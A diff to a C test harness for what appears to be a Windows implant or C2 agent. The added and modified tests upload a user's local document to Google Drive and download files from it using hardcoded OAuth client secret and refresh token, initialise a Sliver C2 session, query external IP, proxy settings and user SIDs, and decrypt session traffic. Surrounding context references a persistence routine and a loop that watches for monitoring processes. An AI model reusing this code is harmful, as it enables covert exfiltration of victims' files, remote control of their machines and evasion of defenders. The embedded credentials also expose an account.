@@ -1,12 +1,4 @@
-﻿#include <Windows.h>
-#include <Utils.h>
-#include <stdio.h>
-#include <Shlwapi.h>
-#include <strsafe.h>
-#include <shlobj_core.h>
-#include <winhttp.h>
-#include <Communication.h>
-#include <sddl.h>
+﻿#include "pch.h"
 
 VOID Callback
 (
@@ -193,10 +185,11 @@ void test5() {
 	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
 	CHAR szClientSecret[] = "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";
 	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
-	PDRIVE_CONFIG pGoogleDriverObj = NULL;
-	pGoogleDriverObj = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
-	RefreshAccessToken(pGoogleDriverObj);
-	GoogleDriveUpload(pGoogleDriverObj, L"C:\\Users\\Admin\\Downloads\\json.hpp");
+	PDRIVE_CONFIG pDriveConfig = NULL;
+	pDriveConfig = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
+	RefreshAccessToken(pDriveConfig);
+	GoogleDriveUpload(pDriveConfig, L"C:\\Users\\Admin\\Downloads\\BC 107.docx");
+	//FreeDri
 }
 
 void test6() {
@@ -206,6 +199,9 @@ void test6() {
 	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
 	LPSTR lpFileId = NULL;
 	PDRIVE_CONFIG pGoogleDriverObj = NULL;
+	PBYTE pFileData = NULL;
+	DWORD cbFileData = 0;
+
 	pGoogleDriverObj = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
 	RefreshAccessToken(pGoogleDriverObj);
 	if (!GetFileId(pGoogleDriverObj, "11-7-2024-16-55-12.hpp", &lpFileId) || lpFileId == NULL) {
@@ -213,10 +209,25 @@ void test6() {
 		return;
 	}
 
-	if (!GoogleDriveDownload(pGoogleDriverObj, lpFileId)) {
+	pFileData = GoogleDriveDownload(pGoogleDriverObj, lpFileId, &cbFileData);
+	
+	if (pFileData == NULL || cbFileData == 0) {
+		if (pFileData != NULL) {
+			FREE(pFileData);
+		}
+
+		FREE(lpFileId);
 		LogError(L"GoogleDriveDownload failed at %lls\n", __FUNCTIONW__);
 		return;
 	}
+
+	HexDump(pFileData, 0x40);
+	if (pFileData != NULL) {
+		FREE(pFileData);
+	}
+
+	FREE(lpFileId);
+	//FreeDr
 }
 
 void test7() {
@@ -847,6 +858,167 @@ void test47() {
 	PersistenceMethod1(szCommandLine);
 }
 
+void test48() {
+	PHTTP_CLIENT pHttpClient = NULL;
+	HTTP_CONFIG HttpConfig;
+	LPSTR lpProxy = NULL;
+	PURI pUri = NULL;
+	LPSTR lpResp = NULL;
+	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
+	PHTTP_RESP pResp = NULL;
+
+	RtlSecureZeroMemory(&HttpConfig, sizeof(HttpConfig));
+	HttpConfig.lpUserAgent = DuplicateStrA(szUserAgent, 0);
+	lpProxy = GetProxyConfig();
+	if (lpProxy != NULL) {
+		if (!lstrcmpA(lpProxy, "auto")) {
+			HttpConfig.pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
+		}
+		else {
+			HttpConfig.pProxyConfig = ProxyInit(UserProvided, lpProxy);
+		}
+	}
+
+	pUri = UriInit("https://api.seeip.org");
+	if (pUri == NULL) {
+		goto CLEANUP;
+	}
+
+	HttpConfig.dwNumberOfAttemps = 10;
+	pHttpClient = HttpClientInit(pUri, HttpConfig.pProxyConfig);
+	pResp = SendHttpRequest(&HttpConfig, pHttpClient, GET, NULL, NULL, 0, FALSE, TRUE);
+	if (pResp == NULL) {
+		goto CLEANUP;
+	}
+
+	lpResp = ALLOC(pResp->cbResp + 1);
+	memcpy(lpResp, pResp->pRespData, pResp->cbResp);
+	printf("Resp Data: %s\n", lpResp);
+CLEANUP:
+	if (lpResp != NULL) {
+		FREE(lpResp);
+	}
+
+	if (lpProxy != NULL) {
+		FREE(lpProxy);
+	}
+
+	if (HttpConfig.lpUserAgent != NULL) {
+		FREE(HttpConfig.lpUserAgent);
+	}
+
+	FreeHttpResp(pResp);
+	FreeWebProxy(HttpConfig.pProxyConfig);
+	FreeHttpClient(pHttpClient);
+}
+
+void test49() {
+	LPWSTR lpProxyUrl = NULL;
+
+	if (!WinHttpDetectAutoProxyConfigUrl(WINHTTP_AUTO_DETECT_TYPE_DNS_A, &lpProxyUrl)) {
+		wprintf(L"WinHttpDetectAutoProxyConfigUrl failed. Error code: 0x%08x\n", GetLastError());
+	}
+
+	wprintf(L"lpProxyUrl: %lls", lpProxyUrl);
+	GlobalFree(lpProxyUrl);
+}
+
+void test50() {
+	WINHTTP_PROXY_INFO ProxyDefault;
+
+	SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
+	if (!WinHttpGetDefaultProxyConfiguration(&ProxyDefault)) {
+		wprintf(L"WinHttpGetDefaultProxyConfiguration failed. Error code: 0x%08x\n", GetLastError());
+		return;
+	}
+
+	wprintf(L"lpszProxy: %lls\n", ProxyDefault.lpszProxy);
+	wprintf(L"lpszProxyBypass: %lls", ProxyDefault.lpszProxyBypass);
+}
+
+void test51() {
+	PSLIVER_HTTP_CLIENT pHttpClient = NULL;
+	pHttpClient = SliverSessionInit();
+	if (pHttpClient == NULL) {
+		return;
+	}
+	
+	printf("SessionID: %s\n", pHttpClient->szSessionID);
+	FreeSliverHttpClient(pHttpClient);
+}
+
+void test52() {
+	/*BYTE SessionKey[] = { 0x95, 0x7d, 0x45, 0x5f, 0x5c, 0xed, 0x74, 0xdf, 0x8, 0xcf, 0x10, 0x15, 0xa1, 0xb1, 0x73, 0x8b, 0x45, 0xac, 0x74, 0x57, 0x71, 0x48, 0x36, 0x4d, 0xe8, 0x49, 0xad, 0x2f, 0x18, 0x4f, 0xce, 0x11 };
+	BYTE Nonce[] = { 0x4f, 0x6a, 0xa6, 0x7e, 0x22, 0x82, 0x3a, 0x63, 0xa1, 0x78, 0xae, 0xe0 };
+	BYTE CipherText[] = { 0xdd, 0xe5, 0xfc, 0x4c, 0xb2, 0x28, 0xe, 0xff, 0x2, 0x2b, 0x8f, 0x56, 0xaf, 0x35, 0x43, 0x4a, 0xde, 0x98, 0x3f, 0xd1, 0xb5, 0x84, 0x77, 0xa3, 0x9e, 0x52, 0xfc, 0x7d, 0xa2, 0x44, 0xaa, 0x92, 0x82, 0x85, 0xc2, 0xdd, 0x43, 0x83, 0x37, 0x18, 0xf0, 0xb, 0x2e, 0x6b, 0x6b, 0xdc, 0xbc, 0x53 };*/
+
+	// -----------------------
+	BYTE SessionKey[] = { 234, 74, 74, 12, 251, 78, 117, 118, 101, 175, 24, 153, 110, 240, 212, 227, 20, 58, 122, 50, 237, 29, 139, 36, 229, 101, 166, 47, 159, 185, 133, 45 };
+	BYTE Nonce[] = { 189, 147, 30, 168, 197, 184, 111, 176, 175, 40, 81, 247 };
+	BYTE CipherText[] = { 186, 46, 74, 199, 245, 172, 132, 246, 179, 28, 129, 194, 96, 41, 128, 21, 103, 222, 254, 242, 234, 89, 148, 174, 81, 127, 131, 87, 214, 0, 34, 133, 214, 3, 44, 119, 121, 179, 62, 156, 37, 83, 92, 90, 221, 127, 138, 174 };
+
+	DWORD cbPlainText = 0;
+	PBYTE pPlainText = NULL;
+
+	pPlainText = Chacha20Poly1305DecryptAndVerify(SessionKey, Nonce, CipherText, _countof(CipherText), NULL, 0, &cbPlainText);
+	if (pPlainText == NULL || cbPlainText == 0) {
+		wprintf(L"Chacha20Poly1305DecryptAndVerify failed.\n");
+		return;
+	}
+
+	HexDump(pPlainText, cbPlainText);
+	FREE(pPlainText);
+}
+
+void test53() {
+	LPSTR lpSid = NULL;
+
+	lpSid = GetCurrentUserSID();
+	if (lpSid == NULL) {
+		return;
+	}
+
+	printf("lpSid: %s\n", lpSid);
+	FREE(lpSid);
+}
+
+void test54() {
+	LPSTR lpSid = NULL;
+
+	lpSid = GetCurrentProcessUserSID();
+	if (lpSid == NULL) {
+		return;
+	}
+
+	printf("lpSid: %s\n", lpSid);
+	FREE(lpSid);
+
+	lpSid = GetCurrentProcessGroupSID();
+	if (lpSid == NULL) {
+		return;
+	}
+
+	printf("lpSid: %s\n", lpSid);
+	FREE(lpSid);
+}
+
+void test55() {
+	/*CHAR szHostName[0x100];
+
+	WSAStartup();
+	SecureZeroMemory(szHostName, sizeof(szHostName));
+	gethostname(szHostName, 0x100);
+	printf("%s\n", szHostName);*/
+}
+
+void test56() {
+	PBYTE pOutput = NULL;
+	DWORD cbOutput = 0;
+
+	pOutput = MarshalVarInt(0x1133557799, &cbOutput);
+	HexDump(pOutput, cbOutput);
+}
+
 VOID DetectMonitorSystem() {
 	while (TRUE) {
 		if (CheckForBlackListProcess()) {
@@ -879,6 +1051,7 @@ int main() {
 	//test1();
 	//test2(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
 	//test3(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
+	//test5();
 	//test6();
 	//test7();
 	//test8();
@@ -920,6 +1093,15 @@ int main() {
 	//test44();
 	//test45();
 	//test46();
-	test47();
+	//test47();
+	//test48();
+	//test49();
+	//test50();
+	//test51();
+	//test52();
+	//test53();
+	//test54();
+	test55();
+	//test56();
 	return 0;
 }
